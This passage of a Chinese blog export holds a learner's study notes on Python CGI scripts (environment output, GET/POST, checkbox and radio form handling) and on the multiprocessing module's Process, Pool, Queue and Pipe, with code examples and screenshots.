<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Content-type:text/html"</span>)</span><br><span class="line"><span class="keyword">print</span> ()                             <span class="comment"># 空行，告诉服务器结束头部</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;html&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;head&gt;'</span>)</span><br><span class="line"><span class="comment"># print ('&lt;meta charset="UTF-8"&gt;')</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;title&gt;Hello Word 你好123！&lt;/title&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;/head&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;body&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;h2&gt; Hello Word! 菜鸟123&lt;/h2&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;/body&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;/html&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#作为http协议的要求，一定要输出http headers</span></span><br><span class="line"><span class="comment">#在存在http headers的前提下，一定要在headers后面打印一个空行，否则服务器会报错</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529204892.39.png" alt></p>
</li>
</ul>
<h3 id="CGI-HTTP头部及CGI环境变量"><a href="#CGI-HTTP头部及CGI环境变量" class="headerlink" title="CGI HTTP头部及CGI环境变量"></a>CGI HTTP头部及CGI环境变量</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205175.71.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205233.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205252.14.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205271.41.png" alt></p>
<h3 id="CGI实例"><a href="#CGI实例" class="headerlink" title="CGI实例"></a>CGI实例</h3><ol>
<li><p>通过CGI输出CGI环境变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">print(<span class="string">"Content-type: text/html"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&lt;b&gt;环境变量&lt;/b&gt;&lt;br&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;ul&gt;"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> os.environ.keys():</span><br><span class="line">    print(<span class="string">"&lt;li&gt;&lt;span style='color:green'&gt;%30s&lt;/span&gt; : %s&lt;/li&gt;"</span> % (i,os.environ[i]))</span><br><span class="line">print(<span class="string">"&lt;/ul&gt;"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205971.94.png" alt></p>
</li>
<li><p>通过CGI实现GET传递信息（也可以通过构造表单的方法实现GET信息传递，默认情况下只存放脚本文件）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建filedstorage的实例、</span></span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据</span></span><br><span class="line">s_name = form.getvalue(<span class="string">'name'</span>)</span><br><span class="line">s_url = form.getvalue(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;title&gt;测试&lt;/title&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;%s博客：%s&lt;/h2&gt;"</span> % (s_name,s_url))</span><br><span class="line">print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529208739.64.png" alt></p>
</li>
<li><p>通过CGI用POST传递数据（使用上面的GET脚本结合表单来POST传递）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"get1.py"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">站点名称: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">站点 URL: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"url"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529209260.07.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529209306.54.png" alt></p>
</li>
<li><p>通过CGI程序来传递CheckBox数据（需要一个表单和CGI处理的脚本文件）</p>
<ul>
<li><p>cgi脚本文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line"></span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收字段数据</span></span><br><span class="line"><span class="keyword">if</span> form.getvalue(<span class="string">'google'</span>):</span><br><span class="line">    google_flag = <span class="string">"是"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    google_flag = <span class="string">"否"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> form.getvalue(<span class="string">'lsowl'</span>):</span><br><span class="line">    lsowl_flag = <span class="string">"是"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    lsowl_flag = <span class="string">"否"</span></span><br><span class="line">print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;title&gt;测试&lt;/title&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;lsowl是否选择了 : %s&lt;/h2&gt;"</span> % lsowl_flag)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;google是否选择了 : %s&lt;/h2&gt;"</span> % google_flag)</span><br><span class="line">print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>传递数据的表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"checkbox.py"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"lsowl"</span> <span class="attr">value</span>=<span class="string">"on"</span> /&gt;</span> lsowl</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"google"</span><span class="attr">value</span>=<span class="string">"on"</span> /&gt;</span> google</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"选择站点"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211130.67.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211139.71.png" alt></p>
</li>
</ul>
</li>
<li><p>通过CGI传递Radio数据（只向服务器传输一个数据）</p>
<ul>
<li><p>传递Radio数据的CGI脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line"></span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> form.getvalue(<span class="string">'site'</span>):</span><br><span class="line">    site = form.getvalue(<span class="string">'site'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    site = <span class="string">'提交的数据为空'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Content-type:text/html"</span>)</span><br><span class="line"><span class="keyword">print</span> ()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;title&gt;测试&lt;/title&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;h2&gt; 选中的网站是 %s&lt;/h2&gt;"</span> % site)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>传递Radio数据的CGI表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"radion.py"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"site"</span> <span class="attr">value</span>=<span class="string">"lsowl"</span> /&gt;</span> lsowl</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"site"</span> <span class="attr">value</span>=<span class="string">"google"</span> /&gt;</span> Google</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211658.49.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211669.84.png" alt></p>
</li>
</ul>
</li>
<li><p>通过CGI程序传递 Textarea 数据、下拉数据等、设置cookie、上传下载文件，这些只需要改一些HTML方法就可以实现，和上面的本质上没有什么区别</p>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>本文是对python的CGI编程的一个学习，学习了CGI及python CGI编程的特性，通过CGI结合前端实现许多功能，由于后面上传下载文件这些只是修改一些方法和HTML元素，本质上差别不大，就没有写完了，可以参考链接</p>
<p>tp://<a href="http://www.runoob.com/python3/python3-cgi-programming.html" target="_blank" rel="noopener">www.runoob.com/python3/python3-cgi-programming.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>CGI编程</tag>
      </tags>
  </entry>
  <entry>
    <title>python多进程</title>
    <url>/2018/06/16/python%E5%A4%9A%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="python多进程"><a href="#python多进程" class="headerlink" title="python多进程"></a>python多进程</h2><blockquote>
<p>python跨平台实现多进程需要使用multiprocessing这个模块，在模块中常用的两个类是process和pool</p>
</blockquote>
<h2 id="process类"><a href="#process类" class="headerlink" title="process类"></a>process类</h2><blockquote>
<p>process类用来描述一个进程对象。创建子进程的时候只需要传入一个执行函数和函数的参数就可以完成process实例的创建。</p>
</blockquote>
<ul>
<li><p>start() 方法启动进程</p>
</li>
<li><p>join()  方法实现进程之间的同步，等待所有进程退出</p>
</li>
<li><p>close()方法阻止多余的进程涌入进程池pool造成进程阻塞</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> __init__(self, group=<span class="keyword">None</span>, target=<span class="keyword">None</span>, name=<span class="keyword">None</span>, args=(), kwargs=&#123;&#125;, *,mon=<span class="keyword">None</span>)</span><br><span class="line">|      初始化类，target指向函数名，name参数可以为该进程设置名称，args是为target指向的函数传入的参数，且为tuple类型的</span><br><span class="line">|</span><br><span class="line">|  is_alive(self)</span><br><span class="line">|      返回这个进程是否alive</span><br><span class="line">|</span><br><span class="line">|  join(self, timeout=<span class="keyword">None</span>)</span><br><span class="line">|      等待，直到子进程执行完毕</span><br><span class="line">|</span><br><span class="line">|  run(self)</span><br><span class="line">|      Method to be run <span class="keyword">in</span> sub-process; can be overridden <span class="keyword">in</span> sub-<span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class">|</span></span><br><span class="line"><span class="class">|  <span class="title">start</span><span class="params">(self)</span></span></span><br><span class="line"><span class="class">|      开启子进程</span></span><br><span class="line"><span class="class">|</span></span><br><span class="line"><span class="class">|  <span class="title">terminate</span><span class="params">(self)</span></span></span><br><span class="line"><span class="class">|      结束进程</span></span><br><span class="line"><span class="class">|  ----------------------------------------------------------------------</span></span><br><span class="line"><span class="class">|  <span class="title">Data</span> <span class="title">descriptors</span> <span class="title">inherited</span> <span class="title">from</span> <span class="title">multiprocessing</span>.<span class="title">process</span>.<span class="title">BaseProcess</span>:</span></span><br><span class="line">|</span><br><span class="line">|  __dict__</span><br><span class="line">|      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined)</span><br><span class="line">|</span><br><span class="line">|  __weakref__</span><br><span class="line">|      list of weak references to the object (<span class="keyword">if</span> defined)</span><br><span class="line">|</span><br><span class="line">|  authkey</span><br><span class="line">|</span><br><span class="line">|  daemon</span><br><span class="line">|      返回该进程是否为守护进程</span><br><span class="line">|</span><br><span class="line">|  exitcode</span><br><span class="line">|      返回进程的退出代码</span><br><span class="line">|</span><br><span class="line">|  ident</span><br><span class="line">|      Return identifier (PID) of process <span class="keyword">or</span> `<span class="keyword">None</span>` <span class="keyword">if</span> it has yet to start</span><br><span class="line">|</span><br><span class="line">|  name</span><br><span class="line">|</span><br><span class="line">|  pid</span><br><span class="line">|      Return identifier (PID) of process <span class="keyword">or</span> `<span class="keyword">None</span>` <span class="keyword">if</span> it has yet to start</span><br></pre></td></tr></table></figure>
</li>
<li><p>process类使用实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing,os</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_proc</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Child process &#123;0&#125; &#123;1&#125; Running'</span>.format(name,os.getpid()))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'Parent process &#123;0&#125; is Running'</span>.format(os.getpid()))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        p = multiprocessing.Process(target=run_proc,args=(str(i),))</span><br><span class="line">        print(<span class="string">'process start'</span>)</span><br><span class="line">        p.start()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'process close'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#这里创建多个进程可以使用for循环，也可以使用进程池，在使用for循环的时候注意join方法在for循环之外</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Pool类"><a href="#Pool类" class="headerlink" title="Pool类"></a>Pool类</h2><ul>
<li><p>Pool类可以提供指定数量的进程供用户使用，默认是CPU核数。当有新的请求提交到Pool的时候，如果进程池没有满，则会创建一个进程执行，如果进程池满了，则会让该请求等待。</p>
</li>
<li><p>Pool对象调用join方法会等待所有的子进程执行完毕</p>
</li>
<li><p>调用join方法前必须调用close()</p>
</li>
<li><p>调用close()以后就不能继续添加新的Process</p>
</li>
<li><p>pool.apply_async() 直接启动了进程，不用使用start来启动（同步执行进程，允许多个进程同时进入进程池）</p>
</li>
<li><p>pool类使用实例（使用apply_async()来执行进程）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_task</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; pid &#123;1&#125; is Running, Parent id is &#123;2&#125;'</span>.format(name,os.getpid(),os.getppid()))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; end'</span>.format(name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'current process &#123;0&#125;'</span>.format(os.getpid()))</span><br><span class="line">    p = multiprocessing.Pool(processes=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        p.apply_async(run_task,args=(i,))</span><br><span class="line">    print(<span class="string">'Waiting for all subprocesses done...'</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'All process done!'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529156949.15.png" alt></p>
</li>
<li><p>pool使用实例（pool.apply(func[,args[，kwds]]) 只允许一个进程进入进程池，在一个进程结束以后，另外一个进程才可以进入执行）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_task</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; pid &#123;1&#125; is running, parent id is &#123;2&#125;'</span>.format(name, os.getpid(), os.getppid()))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; end.'</span>.format(name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'current process &#123;0&#125;'</span>.format(os.getpid()))</span><br><span class="line">    p = multiprocessing.Pool(processes=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        p.apply(run_task,args=(i,))</span><br><span class="line">    print(<span class="string">'Waiting for all subprocesses done...'</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'All process done!'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529156984.47.png" alt></p>
</li>
</ul>
<h2 id="进程间的通信"><a href="#进程间的通信" class="headerlink" title="进程间的通信"></a>进程间的通信</h2><ol>
<li><p>使用python标准库中的subprocess包来fork一个子进程，并运行一个外部的程序</p>
<ul>
<li><p>subprocess.call(command,shell=True) fork一个子进程，并运行一个外部程序(命令)在本进程中显示结果</p>
</li>
<li><p>subprocess.check_output(command)   将外部命令执行结果放入变量，不在控制台输出</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529158361.89.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529158413.44.png" alt></p>
</li>
<li><p>可以看出subprocess.call和check_output的返回结果，call执行成功返回一个0，否则返回非零数，check_output返回命令执行的结果</p>
</li>
</ul>
</li>
<li><p>multiprocessing提供的Queue（Queue用来在多个进程间的通信，Queue有两个方法，get和put）</p>
<ul>
<li><p>put方法用来插入数据到队列中。有两个可选参数，blocked和timeout</p>
<ul>
<li>blocked = True（默认值），timeout 为正</li>
</ul>
<blockquote>
<p>该方法会阻塞 timeout 指定的时间，直到该队列有剩余空间。如果超时，抛出 Queue.Full 异常</p>
</blockquote>
<ul>
<li>blocked = False </li>
</ul>
<blockquote>
<p>如果 Queue 已满，<code>立刻</code>抛出 Queue.Full 异常</p>
</blockquote>
</li>
<li><p>get方法用来从队列中读取并删除一个元素。有两个参数可选，blocked 和 timeout</p>
<ul>
<li>blocked = False （默认），timeout 正值</li>
</ul>
<blockquote>
<p>等待时间内，没有取到任何元素，会抛出 Queue.Empty 异常</p>
</blockquote>
<ul>
<li>blocked = True</li>
</ul>
<blockquote>
<p>Queue 有一个值可用，立刻返回改值；Queue 没有任何元素</p>
</blockquote>
</li>
<li><p>Queue实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"><span class="keyword">import</span> os, time, random</span><br><span class="line"> </span><br><span class="line"><span class="comment">#写数据进程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proc_write</span><span class="params">(q,urls)</span>:</span></span><br><span class="line">    print(<span class="string">'Process &#123;0&#125; is writing...'</span>.format(os.getpid()))</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        q.put(url)</span><br><span class="line">        print(<span class="string">'Put %s to queue..'</span> % url)</span><br><span class="line">        time.sleep(random.random())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#读数据进程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proc_read</span><span class="params">(q)</span>:</span></span><br><span class="line">    print(<span class="string">'Process &#123;0&#125; is reading...'</span>.format(os.getpid()))</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        url = q.get(<span class="keyword">True</span>)</span><br><span class="line">        print(<span class="string">'Get %s from queue...'</span> % url)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    proc_write1 = Process(target=proc_write,args=(q,[<span class="string">'url_1'</span>,<span class="string">'url_2'</span>,<span class="string">'url_3'</span>,<span class="string">'url_4'</span>]))</span><br><span class="line">    proc_write2 = Process(target=proc_write,args=(q,[<span class="string">'url_4'</span>,<span class="string">'url_5'</span>,<span class="string">'url_6'</span>]))</span><br><span class="line">    proc_reader = Process(target=proc_read,args=(q,))</span><br><span class="line">    <span class="comment">#启动子进程写入</span></span><br><span class="line">    proc_write1.start()</span><br><span class="line">    proc_write2.start()</span><br><span class="line">    <span class="comment">#启动子进程读取</span></span><br><span class="line">    proc_reader.start()</span><br><span class="line">    <span class="comment">#等待写入进程结束</span></span><br><span class="line">    proc_write1.join()</span><br><span class="line">    proc_write2.join()</span><br><span class="line">    <span class="comment">#proc_reader进程是死循环，无法等待结束，只能强行终止</span></span><br><span class="line">    proc_reader.terminate()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529159995.04.png" alt></p>
</li>
</ul>
</li>
<li><p>multiprocessing提供的Pipe(常用来在两个进行间的通信，两个进程分别位于<strong>管道的两端</strong>)</p>
<ul>
<li><p>multiprocessing.Pipe([duplex])</p>
</li>
<li><p>pipe实例一（发送列表）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pipe</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(pipe)</span>:</span></span><br><span class="line">    pipe.send([<span class="string">'spm'</span>]+[<span class="number">545</span>,<span class="string">'wdd'</span>])  <span class="comment">#send传输一个列表</span></span><br><span class="line">    pipe.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#实例化两个pipe对象，因为pipe进程通信实在管道的两边</span></span><br><span class="line">    (c1,c2) = Pipe()</span><br><span class="line">    sender = Process(target=send,args=(c1,))</span><br><span class="line">    sender.start()</span><br><span class="line">    print(<span class="string">"c2 got: &#123;0&#125; "</span>.format(c2.recv()))</span><br><span class="line">    c2.close()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529160762.62.png" alt></p>
</li>
<li><p>pipe实例二（发送字典文件）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pipe</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">talk</span><span class="params">(pipe)</span>:</span></span><br><span class="line">    pipe.send(dict(name=<span class="string">'ss'</span>,age=<span class="number">22</span>))</span><br><span class="line">    reply = pipe.recv()</span><br><span class="line">    print(<span class="string">'talk got:'</span>,reply)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    (a1, a2) = Pipe()</span><br><span class="line">    c = Process(target=talk, args=(a2,))  <span class="comment">#创建一个进程</span></span><br><span class="line">    c.start()</span><br><span class="line">    print(<span class="string">'parent got:'</span>,a1.recv())</span><br><span class="line">    a1.send(&#123;x * <span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'spam'</span>&#125;)</span><br><span class="line">    c.join()                 <span class="comment">#传输的数据被 talk 函数内的 pip 管道接收，并赋值给 reply</span></span><br><span class="line">    print(<span class="string">'parent exit'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529161528.8.png" alt></p>
</li>
</ul>
</li>
